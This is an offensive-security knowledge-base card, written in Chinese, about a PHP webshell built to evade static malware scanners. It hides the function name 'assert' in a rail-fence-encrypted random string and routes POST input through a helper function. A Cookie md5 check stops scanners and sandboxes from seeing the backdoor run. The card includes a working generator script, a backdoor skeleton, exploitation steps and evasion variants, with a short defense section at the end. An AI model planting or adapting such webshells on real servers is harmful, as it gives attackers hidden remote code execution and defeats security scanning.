---
id: web-php-rce-webshell-railfence-function-name-helper-post
title: 栅栏加密藏函数名字母 + 辅助函数间接取 POST：绕过河马/安全狗/SHELLPUB 的 PHP 木马
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-railfence-name-helper-post-av-bypass
tags:
- php
- webshell
- av-bypass
- obfuscation
- rail-fence
- transposition-cipher
- dynamic-call
- assert
- hema
- safedog
cve: []
severity: high
confidence: high
affected_versions: PHP ≤ 7.0.9（原文标记）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T06:02:33+08:00'
  notes: 已对照原文核对；图01 密文 Jse-9go6hGs!UtBf(aK*0rtJl、图02 SHELLPUB 对直接版判 PHP 命令执行类木马、图03 辅助函数版扫描 0 后门/0 安全风险、图04 生成器下标输出、图05 myHiddenPost + 下标拼接 + return $config(myHiddenPost('ming')) 均与卡内一致；索引 2,3,3,6,14,17→assert 与原文一致；PHP ≤7.0.9 为原文实测边界，卡内『PHP 7.1+ assert 语义变化』为解释性推断（原文未展开）；图03 扫描器产品名以截图为准（文章正文写河马与安全狗）；未实际运行木马
url: /docs/web/php/rce/web-php-rce-webshell-railfence-function-name-helper-post/
draft: false
kb_aliases:
- 栅栏加密免杀
- 栅栏密码 PHP 木马
- rail fence webshell
- 函数名字母乱序还原
- myHiddenPost 免杀
- assert 拼接免杀
- PHP 木马过河马/安全狗
---

## 一句话结论

把 `assert` 的五个字母 `a/s/e/r/t` 随机撒进 25 字符随机串，再用栅栏（列置换）加密成一段无意义字符串写进 PHP 木马；运行时还原字符表并按记录的下标索引拼出函数名，同时把 POST 取值包进自定义函数 `myHiddenPost()` 后再调用，使文件里既没有完整的 `assert`，也没有“`$_POST` 直接当函数参数”的结构，可绕过河马/SHELLPUB 的静态查杀（D 盾扫描 0 检出）；再加 Cookie md5 门控，只有持有正确 Cookie 的请求才执行。

## 原理

- **栅栏加密是纯置换**：把明文按每行 `n` 个字符写成 `n` 行，再逐列读出。它只改变字符位置、不做替换，因此加密后的字符串看起来是随机字符，但所有原始字母都还在。攻击者把 `a,s,e,r,t` 分散放进 25 字符随机串的不同位置，记录每个字母的索引，加密后把密文和索引拼法写进木马；运行时按 `n` 还原行列，再按索引取字母拼成 `assert`。文件里没有 `assert` 字面量，也没有 `'a'.'s'.'s'...` 这种典型拼接特征。
- **随机化降低特征**：每次生成的 25 字符串、字母位置、栅栏变量都不同，同一样本之间没有稳定字节特征；扫描器难以用固定规则匹配“还原表 + 下标拼接”这一结构。
- **直接 POST 传参会被静态查杀**：最初版本 `$config($_POST['ming'])` 被 SHELLPUB 判为“PHP 命令执行类木马”、河马也报毒。检测器把“变量函数 + 直接从 `$_POST` 取参数”作为启发式特征（等价于一句话木马的典型数据流）。
- **辅助函数打断数据流**：改成 `function myHiddenPost($key){ return isset($_POST[$key]) ? $_POST[$key] : null; }` 后，调用点变成 `$config(myHiddenPost('ming'))`。静态扫描看到的是“函数返回值作为参数”，不再命中“超全局变量直接进函数调用”的规则；扫描器若不做跨函数污点跟踪就无法还原数据流。原文实测该版本通过河马与安全狗，D 盾“共发现 0 个后门”。
- **版本边界**：这种把函数名字符串拼出来再 `$config(...)` 调用 assert 的姿势，原文在 phpstudy 环境实测仅 PHP ≤ 7.0.9 可用；PHP 7.1+ 的 assert 语义变化、PHP 8 不再对字符串求值，需要换成 `system`/`passthru`/`shell_exec` 等 sink。
- **Cookie 门控**：`md5($cookieValue . '_ming') == 固定值` 的校验让木马只对持有正确 Cookie 的请求生效；普通扫描器/沙箱不会带这个 Cookie，即使动态执行也看不到后门行为，起访问控制与规避自动化分析的作用。

## 触发条件

- 目标 PHP 版本满足所用 sink 的要求（原文的 assert 字符串形式为 PHP ≤ 7.0.9）。
- 木马文件能落地并被 Web 访问（上传、写文件、包含等）。
- 防护以静态文件关键字/正则/简单数据流检测为主（河马、D 盾、SHELLPUB 一类）；对强 RASP/运行时行为监控无效。
- 攻击者能控制 POST 参数与（可选的）Cookie。

## 利用步骤

1. 用脚本生成 25 字符随机串，把 `a,s,e,r,t` 随机放到 5 个位置并记录索引，其余位置填随机字符（字符集含字母数字符号）。
2. 用栅栏加密（原文 `rails=3`）把该串变成密文，得到一段无意义字符串。
3. 在木马中写入栅栏解密逻辑，按行列还原出原串，再用记录的下标拼出函数名：`$config=$decodedStr['i1'].$decodedStr['i2'].$decodedStr['i3'].$decodedStr['i4'].$decodedStr['i5'].$decodedStr['i6'];`。
4. 用 `myHiddenPost($key)` 辅助函数取 POST 值，调用 `$config(myHiddenPost('ming'))`，避免 `$config($_POST['ming'])` 的直接结构。
5. 叠加 Cookie 门控（如 `md5(cookie.'_ming')` 等于固定值才进入执行分支）。
6. 用河马/SHELLPUB/D 盾等扫描器对比：直接版会被判恶意，辅助函数版应无检出；再用 `ming=phpinfo();` 验证执行。

## PoC

生成器（随机字母位置 + 栅栏加密）：

```php
<?php
function generate(){
    $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+1234567890';
    $resultString = str_repeat(' ', 25);
    $pos = array_rand(range(0, 24), 5);
    foreach (str_split('asert') as $i => $ch) { $resultString[$pos[$i]] = $ch; }
    foreach (str_split($resultString) as $i => $ch) {
        if ($ch === ' ') { $resultString[$i] = $charset[array_rand(str_split($charset))]; }
    }
    return $resultString;
}
function railFenceEncrypt($text,$rails){
    $f = array_fill(0,$rails,array()); $r = 0;
    for($i=0;$i<strlen($text);$i++){ $f[$r][] = $text[$i]; $r = ($r+1)%$rails; }
    $out=''; foreach($f as $line){ $out .= implode('',$line); } return $out;
}
echo railFenceEncrypt(generate(),3);
```

木马骨架（密文与索引按生成器输出替换）：

```php
<?php
function myHiddenPost($key) {
    return isset($_POST[$key]) ? $_POST[$key] : null;
}
if (isset($_COOKIE['phpsession'])) {
    if (md5($_COOKIE['phpsession'].'_ming') == '<md5值>') {
        $str='<栅栏加密后的随机串>'; $n=3;
        // 按 n 还原行列，得到 $decodedStr
        $config=$decodedStr['<i1>'].$decodedStr['<i2>'].$decodedStr['<i3>'].$decodedStr['<i4>'].$decodedStr['<i5>'].$decodedStr['<i6>'];
        $config(myHiddenPost('ming'));
    }
}
```

说明：原文示例密文 `Jse-9go6hGs!UtBf(aK*0rtJl`、索引 `2,3,3,6,14,17` 与上述结构一致；不同生成器输出只需替换密文与索引。

## 变体与关联

- **函数名来源变体**：`substr`/`strtr`/`substr_replace`/`base64_decode`/`str_rot13`/异或/按位取反等，都是“文件里不出现完整 sink 名”的同一思路，见 [[web-php-rce-webshell-name-rebuild-callback-goto-multilayer]]、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]、[[web-php-rce-webshell-xor-encoded-function-name]]。
- **调用点变体**：冷门回调 `array_uintersect_assoc`/`array_map`/`call_user_func`；本卡用变量函数 + 辅助函数。
- **反查杀变体**：把 `$_POST` 名字也拼接/变量变量化；用 Cookie/UA/参数门控让沙箱不触发执行。
- **版本边界**：PHP 7.1+ / PHP 8 的 assert 不再执行字符串，需改 `system`/`passthru`/`shell_exec`；同时 PHP 8 对可变函数调用仍有约束，需按目标调整。
- **检测对抗**：本卡只对静态扫描有效；流量加密、内存马与 RASP 对抗另属不同层面。

## 检测与防御

- **扫描器侧**：对“函数返回值 → 变量函数调用”做跨函数污点跟踪，而不是只看 `$_POST` 直接调用；识别栅栏/置换解密 + 字符串下标拼接模式（`$decodedStr['n']` 连续拼接后调用）；对随机长串 + 索引常量组合告警。
- **运行时**：RASP/EDR 监控 `assert`/`system` 等动态调用与子进程行为，Cookie 门控只能骗过不执行请求的扫描器。
- **PHP 配置**：升级到 PHP 8+（assert 不再执行字符串）；`disable_functions` 限制 `assert`/`system` 等；关闭不必要的动态函数调用风险。
- **文件与权限**：限制上传目录不可执行、Web 目录只读；监控新出现的 PHP 文件与异常加密串。
- **应急**：检索站内文件中的 `myHiddenPost`、长随机串 + 字符串下标拼接、`md5($_COOKIE...` 组合等特征，结合访问日志中的 Cookie 门控请求定位后门。
